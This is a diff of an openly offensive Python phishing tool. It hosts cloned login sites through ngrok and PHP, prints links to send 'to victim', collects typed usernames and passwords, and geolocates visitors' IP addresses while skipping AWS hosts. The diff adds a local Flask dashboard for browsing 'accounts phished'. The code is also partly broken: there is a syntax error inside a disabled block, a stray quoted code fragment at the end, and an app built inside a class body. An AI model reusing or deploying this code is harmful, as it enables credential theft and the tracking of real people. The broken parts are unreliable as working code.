@@ -1,16 +1,22 @@
 #!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
 import subprocess
 from sys import exit
+from typing import final
 from src.termcolor import colored
 import platform
 from base64 import b64decode
 from zipfile import ZipFile
-from os import walk,path,getcwd,mkdir,remove
+from os import walk,path,getcwd,mkdir,remove,environ
 import threading
 from datetime import datetime
 from src import requests
 from src.torpy.http.requests import TorRequests
-    
+from src.flask import Flask, render_template, request
+import logging
+log = logging.getLogger('werkzeug')
+log.disabled = True
+environ['WERKZEUG_RUN_MAIN'] = 'true'
+
 try:
     subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
 except:
@@ -89,7 +95,7 @@ def refresh():
                 remove('qrcodes/'+file)
 
 def attack(server,url,wifi,custom,qr):
-        
+            
     t1 = threading.Thread(target=start_ngrok)
     t2 = threading.Thread(target=start_php,args=[server])
     t1.setDaemon = True
@@ -112,7 +118,8 @@ def attack(server,url,wifi,custom,qr):
                 try:
                     link = get_link()  
                     qrc = ''
-                    if custom:
+                    shortened = ''
+                    '''if custom:
                         shortened = custom_short(link,custom,sess)
                         if '://' not in shortened:
                             shortened += '\n'+shorten(link,sess)
@@ -123,107 +130,81 @@ def attack(server,url,wifi,custom,qr):
                             ur = shortened if '\n' not in shortened else shortened.split('\n')[-1]
                             qrc = '[*] QR Code for '+ur+' saved at '+qrcode(ur,server,sess)
                         else:
-                            qrc = '[*] QR Code for '+link+' saved at '+qrcode(link,server,sess)
+                            qrc = '[*] QR Code for ']=link+' saved at '+qrcode(link,server,sess)
+                    '''
                     break
                 except Exception as e:
                     print(e)
                     return
             print()
-            print(colored('[*] Send any of these links to victim  :  \n\n','green',attrs=['bold'])+colored(link+'\n'+shortened+'\n'+qrc,'red',attrs=['bold']))
-            print()    
-    if '/' not in server:
-        ztop = 0
-        print(colored('[*] Waiting for victim to open the link....','yellow',attrs=['bold']))
-        while 1:
-            for root, dirs, files in walk(getcwd()+'/sites/'+server):
-                for file in files:
-                    if 'ip.txt' in file:
-                        f = open(path.join(root, file))                    
-                        r = f.read().split('\n')[0]
-                        if '.' in r or ':' in r and r not in my_ip:
-                            f.seek(0)                            
-                            re=f.read().split('\n')         
-                            if re[0].upper() != 'UNKNOWN':
-                                my_ip.append(re[0])                                                 
-                                try:                                
-                                    df = ip_details(re)
-                                    if not df:
-                                        continue                                    
-                                except:
-                                    continue
-                                my_ip = re[0]
-                                ua = re[2]
-                            else:
-                                print(colored('[*] IP address of victim is unknown','red',attrs=['bold']))
-                                my_ip = re[0]
-                                ua = re[0]
-                            print()                            
-                            ztop = 1
-                            f.close()
-                            f = open(path.join(root, file),'w+')
-                        else:
-                            open(path.join(root, file),'w+')
-                        f.close()
-            if ztop:
-                break
-    print(colored('[*] Waiting for victim to enter credentials....','yellow',attrs=['bold']))
-    ztop = 0
-    cred=''
-    while 1:
-        for root, dirs, files in walk(getcwd()+'/sites/'+server):
-            for file in files:
-                if 'victims' in file:
-                    f = open(path.join(root, file))                    
-                    re = f.read()
-                    if re:
-                        if '<button' not in re:
-                            f.seek(0)
-                            cred = f.read().split('\n')[0]
-                            print(colored('\n[*] Victim credentials \n','red',attrs=['bold']))
-                            print(colored(cred,'green',attrs=['bold']))
-                            print()
-                            ztop = 1
-                            f.close()
-                            f = open(path.join(root, file),'w+')
-                    f.close()                                            
-        if ztop:
-            break
-    subprocess.Popen(['killall','-2', 'ngrok', '>' ,'/dev/null', '2>&1'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
-    subprocess.Popen(['killall','-2', 'php', '>' ,'/dev/null', '2>&1'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
-    f = open('logs.log','a+')
-    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-    f.write(now + '\n' + server.split('/')[-1].upper() + '\nCREDENTIALS  ->  ' + cred + '\nIP ADDRESS  ->  ' + my_ip + '\nUSER AGENT -> ' + ua + '\n\n')
-    f.close()
+            print(colored('[*] Send any of these links to victim  :  \n\n','green',attrs=['bold'])+colored(link+'\n'+shortened+'\n'+qrc,'red',attrs=['bold']))            
+    return    
 
-def ip_details(lis):
+def visitors(server):
     
-    ip = lis[0]
-    headers = {
-        "User-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36"
-    }
-    url = 'http://ip-api.com/json/'+ip.strip('\n')
-    dic = requests.get(url,headers=headers).json()
-    if 'AWS' in dic['org']:
-        return 0
-    print()
-    print(colored('[*] Victim has accesed the link','red',attrs=['bold']))
-    print()
-    print('IP ADDRESS : '+lis[0])
-    print('LANGUAGE : '+lis[1])
-    print('USER AGENT : '+lis[2])  
-    print('\nIP ADDRESS DETAILS\n')
-    print('COUNTRY : '+dic['country'])
-    print('COUNTRY CODE : '+dic['countryCode'])
-    print('REGION : '+dic['regionName'])
-    print('CITY : '+dic['city'])
-    print('ZIP CODE : '+dic['zip'])
-    print('ISP LATITUDE : '+str(dic['lat']))
-    print('ISP LONGITUDE : '+str(dic['lon']))
-    print('TIMEZONE : '+dic['timezone'])
-    print('ISP : '+dic['isp'])
-    print('ISP ORGANISATION : '+dic['org'])
-    print('AS : '+dic['as']+'\n')
-    return 1
+    final = ''
+    v1 = '''<div class="row"><input type="radio" name="expand"><span class="cell primary" data-label="IP Address">'''
+    v2 = '''</span><span class="cell" data-label="'''
+    v3 = '">'
+    v4 = "</span>"
+    v5 = "</span></div>"
+    r = open('sites/'+server+'/ip.txt').read().split('\n')
+    f = ip_details(r)
+    if not f:
+        return
+    for a in f:
+        k = list(a.keys())
+        v = list(a.values())
+        final += v1+v[0]+v2
+        for b in range(len(v)-1):
+            final += k[b]+v3+v[b]+v4+v2
+        final += v5
+    return final                        
+
+def victims(server):
+    
+    final = ''
+    v1 = '''<div class="row"><input type="radio" name="expand"><span class="cell primary" data-label="Username">'''
+    v2 = '''</span><span class="cell" data-label="Password">'''
+    v3 = '</span></div>'
+    for a in open('sites/'+server+'/victims.txt').read().split('\n'):
+        if a:
+            b = a.split('<!:!>')
+            final += v1+b[0]+v2+b[1]+v3
+    return final
+
+def ip_details(lisz):
+    
+    final = []
+    lisz = lisz[:-1]
+    for lis in range(len(lisz)):
+        if lisz[lis][0] not in '0123456789':
+            continue
+        finale = {}
+        ip = lisz[lis]
+        headers = {
+            "User-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36"
+        }
+        url = 'http://ip-api.com/json/'+ip.strip('\n')
+        dic = requests.get(url,headers=headers).json()
+        if 'AWS' in dic['org']:
+            return 0
+        finale['IP Address']=lisz[lis]
+        finale['Language']=lisz[lis+1]
+        finale['User Agent']=lisz[lis+2] 
+        finale['Country']=dic['country']
+        finale['Country Code']=dic['countryCode']
+        finale['Region']=dic['regionName']
+        finale['City']=dic['city']
+        finale['Zip Code']=dic['zip']
+        finale['ISP Latitude']=str(dic['lat'])
+        finale['ISP Longitude']=str(dic['lon'])
+        finale['Timezone']=dic['timezone']
+        finale['ISP']=dic['isp']
+        finale['ISP Organisation']=dic['org']
+        finale['AS']=dic['as']
+        final.append(finale) 
+    return final
     
 
 def main():    
@@ -382,8 +363,35 @@ def main():
     qr = input(colored('[*] Do you want to generate a QR Code for the link (Y/N)? '))
     qr = 1 if qr.upper() == 'Y' else 0
     attack(server,redir_url,wifi_model,custom,qr)
+    final = '''[*] Navigate to http://127.0.0.1:5000 from your browser to view accounts phished\n\n[*] Press ctrl+C to quit'''
+    print(colored(final,'yellow',attrs=['bold']))
+    return server
 
+app = Flask(__name__)
+
+class web_server:
+    global server        
+    refresh()
+    server = main()       
+    if not server:
+        exit()
+    @app.route('/',methods = ['GET'])
+    def index():  
+        return render_template('index.html')
+            
+    @app.route('/visitors')
+    def index2():
+        return render_template('visitors.html')+visitors(server)
+
+    @app.route('/victims')
+    def index3():
+        return render_template('victims.html')+victims(server)
+    
 if __name__ == '__main__' and platform.system().upper() != 'WINDOWS':
     
-    refresh()
-    main()     
+    app.run()    
+'''
+f = open('logs.log','a+')
+    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    f.write(now + '\n' + server.split('/')[-1].upper() + '\nCREDENTIALS  ->  ' + cred + '\nIP ADDRESS  ->  ' + my_ip + '\nUSER AGENT -> ' + ua + '\n\n')
+    f.close()'''
